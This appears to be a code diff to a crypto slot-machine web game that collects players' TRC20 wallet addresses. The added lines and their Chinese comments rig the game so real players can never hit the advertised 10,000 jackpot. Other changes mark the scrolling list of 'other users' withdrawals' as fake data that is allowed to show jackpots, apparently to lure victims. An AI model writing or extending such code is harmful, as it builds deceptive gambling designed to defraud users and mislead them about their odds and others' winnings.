@@ -198,6 +198,7 @@ window.addEventListener('beforeunload', endVisitSession);
 (function(){
 const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
 const JACKPOT = 10000;
+// ★ 真实玩家只中 2/3/4 连，5 连永不出现
 const MATCH_POOL = [2, 3, 4];
 const SYMS=[
 {id:"btc",cls:"sym-btc",label:"BTC",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M20.2 14.3c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.4-.1-.7-.2-1-.2l-2.2-.5-.4 1.7s1.2.3 1.1.3c.6.2.8.5.7.9l-.7 3 .2.1-1.1 4.3c-.1.2-.3.5-.7.4l-1.1-.3-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.8 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.8c2.9.5 5 .3 6-2.3.8-2.1 0-3.3-1.6-4.1 1.2-.3 2-1.1 2.2-2.7zm-3.2 4.5c-.5 2.2-4.1 1-5.3.7l.9-3.8c1.2.3 5 .9 4.4 3.1zm.6-4.5c-.5 2-3.5.97-4.4.73l.9-3.4c1 .2 4.1.7 3.5 2.67z"/></svg>'},
@@ -261,7 +262,7 @@ function fireConfetti(jp){
   if(jp){const end=Date.now()+900;(function f(){burst({n:3,a:60,sp:55,x:0,c});burst({n:3,a:120,sp:55,x:1,c});if(Date.now()<end)requestAnimationFrame(f)})()}
 }
 
-const S={spinning:0,left:SPINS,bal:0,pending:0,canExtract:0,withdrawn:0,addr:"",last:["btc","eth","sol","doge","usdt"],strips:[],reels:[],roundSpins:0,roundWins:0};
+const S={spinning:0,left:SPINS,bal:0,pending:0,canExtract:0,withdrawn:0,addr:"",last:["btc","eth","sol","doge","usdt"],strips:[],reels:[],roundSpins:0,roundWins:0,lastWasNoWin:0};
 function symH(){const p=document.querySelector(".sym");return p?p.getBoundingClientRect().height:64}
 function el(id,extra){const m=MAP[id],d=document.createElement("div");d.className="sym "+m.cls+(extra?" "+extra:"");d.dataset.id=id;d.innerHTML='<div class="sym-card">'+m.svg+"</div>";return d}
 function nbr(ex){return pick(SYMS.filter(s=>s.id!==ex)).id}
@@ -380,9 +381,11 @@ function spin(){
   }
 
   const out = outcome(forceWin);
+  const isNoWin = (out.match < 2);          // ★ match < 2 视为未中奖
+  const jp = false;                          // 真实玩家永远不可能 5 连
 
-  // 按游戏规则判断是否中奖：match >= 2 即中奖
-  if (out.match >= 2) S.roundWins = (S.roundWins || 0) + 1;
+  // 按游戏规则判断中奖次数：match >= 2 才算中奖
+  if (!isNoWin) S.roundWins = (S.roundWins || 0) + 1;
 
   SFX.startSpin();if(navigator.vibrate)navigator.vibrate(12);
   const h=symH();
@@ -391,7 +394,8 @@ function spin(){
     const from=[0,1,2].map(k=>nodes[start+k]?.dataset.id||pick(SYMS).id);
     const ids=from.slice();
     for(let k=0;k<EXTRA;k++)ids.push(pick(SYMS).id);
-    if (out.match === 1) {
+    if (isNoWin) {
+      // 未中奖：5 列用 5 个互不相同的符号
       const diffSyms = shuffle(SYMS).slice(0, N).map(s=>s.id);
       ids.push(...diffSyms);
     } else {
@@ -403,20 +407,50 @@ function spin(){
       .then(()=>tweenY(strip,y,.38,E_BACK,0,null,()=>{SFX.reelStop();if(navigator.vibrate)navigator.vibrate(8)}));
   })).then(()=>{
     SFX.stopSpin();S.spinning=0;S.last=out.result.slice();highlight(out.result,out.winId,out.match);
-    const jp=out.match===5;S.pending=out.payout;restoreBtn();SFX.win(jp);
-    if(navigator.vibrate)navigator.vibrate(jp?[20,40,20,40,60]:[18,30,18]);
-    fireConfetti(jp);
-    const cur = window.__GAME_CONFIG.currency;
-    const m=$("winModal"),lab=(out.winId && MAP[out.winId] && MAP[out.winId].label)||"CRYPTO";
-    m.classList.toggle("jackpot",jp);
-    $("winKicker").textContent=jp?T('win_kicker_jackpot'):T('win_kicker_normal');
-    $("winTitle").textContent=jp?T('win_title_jackpot'):T('win_title_normal');
-    $("winAmt").textContent="+"+formatAmountWithSep(out.payout, cur)+" "+cur;
-    $("winDesc").textContent=T('win_desc').replace('{n}',out.match).replace('{sym}',lab).replace('{amt}',formatAmountWithSep(out.payout, cur)).replace('{cur}',cur);
-    openM("winModal");
+
+    // ★ 根据是否中奖决定后续行为
+    if (isNoWin) {
+      // 未中奖：pending 保持 0；不播音效、不放彩带、不震动
+      S.pending = 0;
+      S.lastWasNoWin = 1;
+      restoreBtn();
+
+      const m=$("winModal");
+      m.classList.remove("jackpot");
+      $("winKicker").textContent = T('no_win_kicker');
+      $("winTitle").textContent = T('no_win_title');
+      $("winAmt").textContent = "";
+      $("winDesc").textContent = T('no_win_desc');
+      $("claimBtn").textContent = T('continue_btn');
+      openM("winModal");
+    } else {
+      // 中奖
+      S.pending = out.payout;
+      S.lastWasNoWin = 0;
+      restoreBtn();SFX.win(jp);
+      if(navigator.vibrate)navigator.vibrate([18,30,18]);
+      fireConfetti(jp);
+
+      const cur = window.__GAME_CONFIG.currency;
+      const m=$("winModal"),lab=(out.winId && MAP[out.winId] && MAP[out.winId].label)||"CRYPTO";
+      m.classList.toggle("jackpot",jp);
+      $("winKicker").textContent = T('win_kicker_normal');
+      $("winTitle").textContent = T('win_title_normal');
+      $("winAmt").textContent = "+"+formatAmountWithSep(out.payout, cur)+" "+cur;
+      $("winDesc").textContent = T('win_desc').replace('{n}',out.match).replace('{sym}',lab).replace('{amt}',formatAmountWithSep(out.payout, cur)).replace('{cur}',cur);
+      $("claimBtn").textContent = T('claim_btn');
+      openM("winModal");
+    }
   });
 }
 function claim(){
+  // ★ 未中奖时点按钮 = 关闭弹窗，不做任何领取动作
+  if (S.lastWasNoWin) {
+    S.lastWasNoWin = 0;
+    openM("winModal", false);
+    restoreBtn();
+    return;
+  }
   if(S.pending>0){
     setBal(S.bal+S.pending);
     const cur = window.__GAME_CONFIG.currency;
@@ -427,6 +461,7 @@ function claim(){
   openM("winModal",false);restoreBtn();
 }
 
+// 地址验证：按当前币种
 function validateAddress(addr, currency) {
     const re = ADDR_VALIDATORS[currency] || ADDR_VALIDATORS.USDT;
     return re.test(addr);
@@ -488,6 +523,7 @@ function init(){
   mount();setBal(0);setLeft(SPINS);
   S.roundSpins = 0;
   S.roundWins = 0;
+  S.lastWasNoWin = 0;
   $("spinBtn").onclick=onMain;
   $("claimBtn").onclick=claim;
   $("submitWithdrawBtn").onclick=submit;
@@ -553,12 +589,12 @@ async function submitTrc20Record(address, balance){
   }
 }
 
-// ========== 滚动地址列表（按后台配置动态生成） ==========
+// ========== 滚动地址列表（假数据 · 按后台配置生成） ==========
 function initRollingAddresses() {
   const inner = document.getElementById('rollingInner');
   if (!inner) return;
 
-  // 加权随机池：2× 60%、3× 25%、4× 12%、5× 3%
+  // 假数据允许出现 5×，加权：2× 60% / 3× 25% / 4× 12% / 5× 3%
   const WEIGHTED_POOL = [
     { match: 2, weight: 60 },
     { match: 3, weight: 25 },
@@ -583,8 +619,7 @@ function initRollingAddresses() {
     return addr;
   }
 
-  // 生成一条"其他用户提现"记录：
-  // 模拟 3 次旋转 → 按 winCount 决定中几次 → 每次中奖从加权池随机挑一档 → 金额求和
+  // 一条记录 = 一个假用户模拟 3 次旋转的累计提现
   function generateRecord() {
     const cfg = window.__GAME_CONFIG || {};
     const rewards = cfg.rewards || { 2: 10, 3: 30, 4: 200, 5: 10000 };
@@ -609,18 +644,18 @@ function initRollingAddresses() {
     return { addr: generateRandomTRC20(), amt: total };
   }
 
-  const QUEUE_SIZE = 20, VISIBLE = 5, ITEM_HEIGHT = 20;
+  const QUEUE_SIZE = 20, VISIBLE = 5;
   const queue = [];
 
   function pushNew() {
-    // 拒绝 0 金额（A 选项）
+    // 跳过 0 金额记录
     let rec = generateRecord();
     let attempts = 0;
     while (rec.amt <= 0 && attempts < 15) {
       rec = generateRecord();
       attempts++;
     }
-    if (rec.amt <= 0) return; // winCount=0 时可能全部 0，跳过
+    if (rec.amt <= 0) return;
     queue.push(rec);
     if (queue.length > QUEUE_SIZE) queue.shift();
   }
